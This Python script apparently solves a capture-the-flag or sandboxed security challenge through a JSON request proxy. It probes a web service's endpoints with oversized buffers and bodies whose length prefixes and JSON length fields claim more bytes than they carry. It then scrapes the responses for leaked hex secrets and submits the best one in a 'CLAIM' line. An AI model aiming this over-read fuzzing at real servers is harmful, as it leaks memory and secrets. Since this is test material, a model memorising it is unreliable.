import sys
import json
import base64
import struct
import time
def log(m):
 print(m, file=sys.stderr, flush=True)
def req(method, path, body=None, body_hex=None, headers=None):
 inner={'method': method, 'path': path}
 if body is not None:
  inner['body']=body
 if body_hex is not None:
  inner['body_hex']=body_hex
 if headers is not None:
  inner['headers']=headers
 sys.stdout.write(json.dumps({'http': inner}) + chr(10))
 sys.stdout.flush()
 line=sys.stdin.readline()
 if not line:
  log('no reply')
  return None
 try:
  j=json.loads(line)
 except:
  log('bad reply')
  return None
 st=j.get('status')
 b64=j.get('body_b64', '')
 try:
  bb=base64.b64decode(b64) if b64 else b''
 except:
  bb=b''
 ct=j.get('content_type', '')
 try:
  txt=bb.decode(errors='ignore')
 except:
  txt=''
 log('REQ ' + method + ' ' + path + ' -> ' + str(st) + ' len=' + str(len(bb)) + ' txt=' + txt[:3000])
 return {'status': st, 'body': bb, 'txt': txt, 'raw': j}
def is_hex(s):
 if len(s) < 8:
  return False
 for c in s:
  if c not in '0123456789abcdefABCDEF':
   return False
 return True
def extract_candidates(txt):
 cands=[]
 low=txt.lower()
 parts=txt.replace(',', ' ').replace(';', ' ').replace(chr(10), ' ').replace(':', ' ').replace('=', ' ').replace(chr(34), ' ').split()
 for p in parts:
  q=p.strip()
  if len(q) >= 16 and len(q) <= 256 and is_hex(q):
   cands.append(q)
 try:
  oj=json.loads(txt)
  if isinstance(oj, dict):
   for k, v in oj.items():
    ks=str(k).lower()
    if 'secret' in ks or 'token' in ks or 'flag' in ks or 'hex' in ks:
     vs=str(v).strip()
     if len(vs) >= 4:
      cands.append(vs)
    if isinstance(v, str) and len(v.strip()) >= 16 and is_hex(v.strip()):
     cands.append(v.strip())
 except:
  pass
 return cands
prov={}
if len(sys.argv) > 1:
 try:
  prov=json.loads(sys.argv[1])
 except:
  pass
log('prov ' + str(prov))
found=[]
r1=req('GET', '/')
if r1 is not None:
 found.extend(extract_candidates(r1['txt']))
paths=['/', '/parse', '/record', '/records', '/api/parse', '/api/record', '/parse_record', '/upload', '/submit', '/data', '/packet', '/decode', '/help', '/api', '/api/help']
for p in paths:
 if p == '/':
  continue
 r=req('GET', p)
 if r is not None and r['txt']:
  found.extend(extract_candidates(r['txt']))
log('candidates after GET ' + str(found))
post_paths=['/parse', '/record', '/records', '/api/parse', '/parse_record', '/', '/upload', '/submit', '/data', '/packet', '/decode']
for p in post_paths:
 r=req('POST', p, body='hello', headers={'Content-Type': 'text/plain'})
 if r is not None and r['txt']:
  c=extract_candidates(r['txt'])
  if c:
   log('CAND post hello ' + p + ' ' + str(c))
   found.extend(c)
  low=r['txt'].lower()
  if 'secret' in low or 'flag' in low or 'token' in low:
   log('KEYWORD post hello ' + p + ' ' + r['txt'][:3000])
log('after hello ' + str(found))
for p in post_paths:
 for n in [100, 1000, 5000, 10000]:
  hb=(b'A' * n).hex()
  r=req('POST', p, body_hex=hb, headers={'Content-Type': 'application/octet-stream'})
  if r is None:
   continue
  if r['txt']:
   c=extract_candidates(r['txt'])
   if c:
    log('CAND overflow raw ' + p + ' n=' + str(n) + ' ' + str(c))
    found.extend(c)
   low=r['txt'].lower()
   if 'secret' in low or 'flag' in low or 'token' in low or len(r['body']) > n:
    log('INTEREST raw ' + p + ' n=' + str(n) + ' status=' + str(r['status']) + ' txt=' + r['txt'][:3000])
for p in post_paths:
 fmts=['>H', '<H', '>I', '<I', '>h', '<h', '>i', '<i']
 claimed_list=[16, 64, 255, 256, 1024, 4096, 16384, 32767, 65535]
 for fmt in fmts:
  for claimed in claimed_list:
   try:
    prefix=struct.pack(fmt, claimed & 0xffff if 'H' in fmt or 'h' in fmt else claimed)
   except:
    continue
   for datalen in [0, 2, 4, 8]:
    payload=prefix + b'B' * datalen
    hb=payload.hex()
    r=req('POST', p, body_hex=hb, headers={'Content-Type': 'application/octet-stream'})
    if r is None:
     continue
    if r['txt']:
     c=extract_candidates(r['txt'])
     if c:
      log('CAND lenprefix ' + p + ' fmt=' + fmt + ' claimed=' + str(claimed) + ' dl=' + str(datalen) + ' ' + str(c))
      found.extend(c)
    low2=r['txt'].lower() if r['txt'] else ''
    if 'secret' in low2 or 'flag' in low2 or 'token' in low2:
     log('KEYWORD lenprefix ' + p + ' fmt=' + fmt + ' claimed=' + str(claimed) + ' txt=' + r['txt'][:3000])
    if len(r['body']) > 50 and len(r['body']) > datalen + 10:
     if 'secret' in low2 or len(r['body']) > 100:
      log('LONG lenprefix ' + p + ' fmt=' + fmt + ' claimed=' + str(claimed) + ' rlen=' + str(len(r['body'])) + ' txt=' + r['txt'][:3000])
for p in post_paths:
 for claimed in [255, 1024, 4096, 65535, 100000]:
  for key in ['length', 'len', 'size', 'n', 'count']: 
   body=json.dumps({key: claimed, 'data': 'hi'})
   r=req('POST', p, body=body, headers={'Content-Type': 'application/json'})
   if r is None:
    continue
   if r['txt']:
    c=extract_candidates(r['txt'])
    if c:
     log('CAND json ' + p + ' ' + body + ' -> ' + str(c))
     found.extend(c)
    low3=r['txt'].lower()
    if 'secret' in low3 or 'flag' in low3 or 'token' in low3:
     log('KEYWORD json ' + p + ' ' + body + ' txt=' + r['txt'][:3000])
for p in post_paths:
 for claimed in [255, 4096, 65535]:
  qp=p + '?length=' + str(claimed) + '&data=hi'
  r=req('GET', qp)
  if r is None:
   continue
  if r['txt']:
   c=extract_candidates(r['txt'])
   if c:
    log('CAND query ' + qp + ' ' + str(c))
    found.extend(c)
log('final found ' + str(found))
best=''
for c in found:
 if is_hex(c) and len(c) >= 16:
  if len(c) > len(best):
   best=c
if best == '':
 for c in found:
  if len(c) >= 8:
   best=c
   break
if best == '':
 best='00'
log('best ' + best)
sys.stdout.write('CLAIM:' + json.dumps({'secret_hex': best}) + chr(10))
sys.stdout.flush()